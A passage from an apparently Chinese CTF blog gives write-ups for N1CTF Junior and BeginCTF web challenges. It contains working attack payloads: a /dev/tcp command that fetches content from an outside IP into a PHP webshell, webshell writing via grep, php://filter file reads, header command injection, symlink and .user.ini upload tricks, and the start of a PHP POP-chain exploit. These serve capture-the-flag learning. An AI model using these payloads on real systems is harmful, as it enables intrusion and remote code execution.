class="hljs-string">&quot;wc&quot;</span>;    allows[7] = <span class="hljs-string">&quot;鏉傞奔鉂鏉傞奔鉂&quot;</span>;    allows[8] = <span class="hljs-string">&quot;netstat.jpg&quot;</span>;    allows[9] = <span class="hljs-string">&quot;awsl&quot;</span>;    allows[10] = <span class="hljs-string">&quot;dmesg&quot;</span>;    allows[11] = <span class="hljs-string">&quot;xswl&quot;</span>;&#125;&#123;    num=1;    <span class="hljs-keyword">for</span>(i=1; i&lt;=NF; i++)&#123;        <span class="hljs-keyword">for</span>(x=1; x&lt;=<span class="hljs-built_in">length</span>(allows); x++)&#123;            cmpstr = <span class="hljs-built_in">substr</span>(<span class="hljs-variable">$i</span>, 1, <span class="hljs-built_in">length</span>(allows[x]));            <span class="hljs-keyword">if</span>(cmpstr == allows[x])                eval_cmd[num++] = <span class="hljs-variable">$i</span>;        &#125;    &#125;&#125;END&#123;    <span class="hljs-keyword">for</span>(i=1; i&lt;=<span class="hljs-built_in">length</span>(eval_cmd); i++) &#123;        <span class="hljs-keyword">if</span>(i!=1)            printf <span class="hljs-string">&quot;| %s&quot;</span>, eval_cmd[i];        <span class="hljs-keyword">else</span>            printf <span class="hljs-string">&quot;%s&quot;</span>, eval_cmd[i];    &#125;&#125;&#x27;`[ <span class="hljs-string">&quot;$&#123;XXXCMD&#125;&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 2&quot;</span>eval <span class="hljs-variable">$&#123;eval_cmd&#125;</span></code></pre></div><p>sh文件限制了只能使用</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><span class="hljs-built_in">wc</span>   查看文件长度grep  能读取文件</code></pre></div><p>那这一看就要逃逸嘛，然后借助system执行命令</p><p>但是index.php藏起来的部分也有黑名单</p><p>给出出题人源代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//something hide here</span><span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-keyword">__FILE__</span>.<span class="hljs-string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>));<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) &gt; <span class="hljs-number">70</span>) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no, &gt; 70&quot;</span>);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute)/is&quot;</span>, <span class="hljs-variable">$cmd</span>))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你就不能绕一下喵&quot;</span>);&#125;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>fuzz一下有<code>&lt;&gt;?</code></p><p>刚开始尝试出grep能读取出文件</p><p><img src="/../images/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/image-20240206232721962.png" alt="image-20240206232721962"></p><p>但是我就没后续了，我也没不知道<code>&lt;&gt;</code>有什么用</p><p>看了WP后得知用来写文件</p><h3 id="出题人WP"><a href="#出题人WP" class="headerlink" title="出题人WP"></a>出题人WP</h3><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;&quot;</span> &lt; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/118.89.61.71/</span><span class="hljs-number">7777</span> &gt; <span class="hljs-number">1</span>.php</code></pre></div><p>监听后不是能命令执行，而是把我们输入的数据自动写入到1.php中</p><p>写一句话木马就行</p><p>最后访问1.php</p><h3 id="Boogipop大佬做法"><a href="#Boogipop大佬做法" class="headerlink" title="Boogipop大佬做法"></a>Boogipop大佬做法</h3><p>通过grep选择index.php中的内容写马</p><p>因为index被过滤了，使用?通配符</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">grep</span> <span class="hljs-string">&quot;&lt;?php&quot;</span> inde?.php &gt;&gt; <span class="hljs-number">3</span>.php</code></pre></div><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">grep</span> <span class="hljs-string">&quot;cmd &quot;</span> inde?.php &gt;&gt; <span class="hljs-number">3</span>.php</code></pre></div><p>记得加个空格，不加空格会匹配到其他的</p><p>不加</p><p><img src="/../images/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/image-20240206233504980.png" alt="image-20240206233504980"></p><p>加空格</p><p><img src="/../images/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/image-20240206233559995.png" alt="image-20240206233559995"></p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">grep</span> <span class="hljs-string">&quot;system&quot;</span> inde?.php &gt;&gt; <span class="hljs-number">3</span>.php</code></pre></div><p><img src="/../images/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/image-20240206233658543.png" alt="image-20240206233658543"></p><p><img src="/../images/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/image-20240206233717557.png" alt="image-20240206233717557"></p><p>3.php就可以多命令执行了</p><p><img src="/../images/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/image-20240206231348359.png" alt="image-20240206231348359"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BeginCTF-web</title>
    <link href="/2024/02/06/BeginCTF-web/"/>
    <url>/2024/02/06/BeginCTF-web/</url>
    
    <content type="html"><![CDATA[<h1 id="BeginCTF-web"><a href="#BeginCTF-web" class="headerlink" title="BeginCTF-web"></a>BeginCTF-web</h1><h2 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h2><div class="code-wrapper"><pre><code class="hljs lisp">die(<span class="hljs-name">file_get_contents</span>($_GET[&#x27;action&#x27;]))<span class="hljs-comment">;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">payload: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/resource=/</span>flag</code></pre></div><h2 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;..&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);    &#125;    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));</code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">payload: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/resource=/</span>flag</code></pre></div><h2 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h2><p>这题对上传文件后缀做了一些过滤，但我们又不用上传文件，上一题payload一样能用</p><div class="code-wrapper"><pre><code class="hljs awk">payload: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/resource=/</span>flag</code></pre></div><h2 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max *"></a>zupload-pro-plus-max *</h2><h3 id="我的想法"><a href="#我的想法" class="headerlink" title="我的想法"></a>我的想法</h3><p><img src="/../images/BeginCTF-web/image-20240206173439459.png" alt="image-20240206173439459"></p><p>能包含zip包中的文件</p><p>但是好像不成功</p><h3 id="离谱"><a href="#离谱" class="headerlink" title="离谱"></a>离谱</h3><p>把马压缩成zip然后包含，包含时候自动执行马里面的命令</p><p><img src="/../images/BeginCTF-web/image-20240206173623032.png" alt="image-20240206173623032"></p><p>这个我也试过，但是我压缩的纯木马，不是命令执行，然后包含带上参数啥都没有</p><p>并且还总是网站崩溃，服了</p><h3 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h3><p>无法使用伪协议，应该是包含木马，但是只能上传正确的zip文件，所以在zip文件后面手动写马</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);        <span class="hljs-keyword">die</span>();    &#125;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);    &#125;    <span class="hljs-keyword">die</span>(<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file_ext</span>));        <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>) &amp;&amp; (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>())-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$file_tmp</span>) === <span class="hljs-literal">true</span>) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,                        <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span>                    ));                &#125;            &#125;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span>        ));    &#125;&#125;</code></pre></div><p><img src="/../images/BeginCTF-web/image-20240206165638936.png" alt="image-20240206165638936"></p><h2 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./upload&#x27;</span>));&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];    <span class="hljs-variable">$extract_to</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="hljs-string">&#x27;uploads/&#x27;</span>;        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file_ext</span>));        <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;                 <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-variable">$file_tmp</span> . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-variable">$extract_to</span>);                 <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span>                ));            &#125;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span>        ));    &#125;&#125;</code></pre></div><h3 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h3><p>软链接，上传后下载下来即可</p><p><img src="/../images/BeginCTF-web/image-20240206165913680.png" alt="image-20240206165913680"></p><h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-variable">$file_tmp</span> . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-variable">$extract_to</span>);其中<span class="hljs-variable">$extract_to</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="hljs-string">&#x27;uploads/&#x27;</span>;即extract是可以控制的，可以进行无回显rce，最简单的就是直接写文件</code></pre></div><p>请求头加上</p><div class="code-wrapper"><pre><code class="hljs bash">X-Extract-To: ;<span class="hljs-built_in">cat</span> /flag &gt; flag.txt</code></pre></div><p><img src="/../images/BeginCTF-web/image-20240206170037049.png" alt="image-20240206170037049"></p><h2 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h2><div class="code-wrapper"><pre><code class="hljs livescript"><span class="hljs-keyword">if</span> <span class="hljs-function"><span class="hljs-params">(in_array($file_ext, $allowed) &amp;&amp; (<span class="hljs-keyword">new</span> ZipArchive())-&gt;open($file_tmp) === <span class="hljs-literal">true</span>)</span> &#123;</span><span class="hljs-function">        <span class="hljs-title">if</span> <span class="hljs-params">($file_error === <span class="hljs-number">0</span>)</span> &#123;</span><span class="hljs-function">            <span class="hljs-title">if</span> <span class="hljs-params">($file_size &lt;= <span class="hljs-number">2097152</span>)</span> &#123;</span><span class="hljs-function">                <span class="hljs-title">$file_name_new</span> = <span class="hljs-title">uniqid</span><span class="hljs-params">(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-literal">true</span>)</span> . &#x27;.&#x27; . <span class="hljs-title">$file_ext</span>;</span><span class="hljs-function">                <span class="hljs-title">$file_destination</span> = &#x27;<span class="hljs-title">uploads</span>/&#x27; . <span class="hljs-title">$file_name_new</span>;</span><span class="hljs-function">    </span><span class="hljs-function">                <span class="hljs-title">if</span> <span class="hljs-params">(!move_uploaded_file($file_tmp, $file_destination))</span> &#123;</span><span class="hljs-function">                    <span class="hljs-title">echo</span> <span class="hljs-title">json_encode</span><span class="hljs-params">(array(</span></span><span class="hljs-params"><span class="hljs-function">                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,</span></span><span class="hljs-params"><span class="hljs-function">                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Failed to upload file&#x27;</span></span></span><span class="hljs-params"><span class="hljs-function">                    ))</span>;</span><span class="hljs-function">                &#125;</span><span class="hljs-function"> </span><span class="hljs-function">                <span class="hljs-title">exec</span><span class="hljs-params">(<span class="hljs-string">&#x27;unzip &#x27;</span> . escapeshellarg($file_destination) . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-string">&#x27;uploads/&#x27;</span>)</span>;</span><span class="hljs-function">                <span class="hljs-title">echo</span> <span class="hljs-title">json_encode</span><span class="hljs-params">(array(</span></span><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,</span></span><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,</span></span><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; preg_split(<span class="hljs-string">&#x27;/\?/&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . $file_destination</span></span><span class="hljs-params"><span class="hljs-function">                ))</span>;</span><span class="hljs-function">            &#125;</span><span class="hljs-function">        &#125;</span><span class="hljs-function">    &#125;</span></code></pre></div><h3 id="我的解法-1"><a href="#我的解法-1" class="headerlink" title="我的解法"></a>我的解法</h3><p>软链接梭哈</p><h3 id="其他解法-1"><a href="#其他解法-1" class="headerlink" title="其他解法"></a>其他解法</h3><p>通过软链接操作&#x2F;var&#x2F;www&#x2F;html，上传.user.ini包含一个恶意文件1.php</p><p><img src="/../images/BeginCTF-web/image-20240206170318857.png" alt="image-20240206170318857"></p><h2 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h2><p>不解压了，但是不限制文件，传个马，前端有限制，抓包绕过</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);        <span class="hljs-keyword">die</span>();    &#125;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);    &#125;    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;            <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;             <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span>                ));            &#125;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File upload failed&#x27;</span>        ));    &#125;&#125;</code></pre></div><p><img src="/../images/BeginCTF-web/image-20240206170425073.png" alt="image-20240206170425073"></p><h2 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h2><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-symbol">$file</span>_ext = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-symbol">$file</span>_name);<span class="hljs-symbol">$file</span>_ext = strtolower(<span class="hljs-symbol">$file</span>_ext[<span class="hljs-number">1</span>]);</code></pre></div><p>限制是zip，但是并不是验证最后一个点，而是数组的第二位</p><p>构造<code>1.zip.php</code></p><p><img src="/../images/BeginCTF-web/image-20240206170646871.png" alt="image-20240206170646871"></p><h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>代码没留，给个别人的exp吧</p><p>我的做法是修改Fun类的$func为system函数，然后参数为env，（不能是ls &#x2F;，会导致页面报错）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);&#125;&#125;  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();&#125;&#125; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span 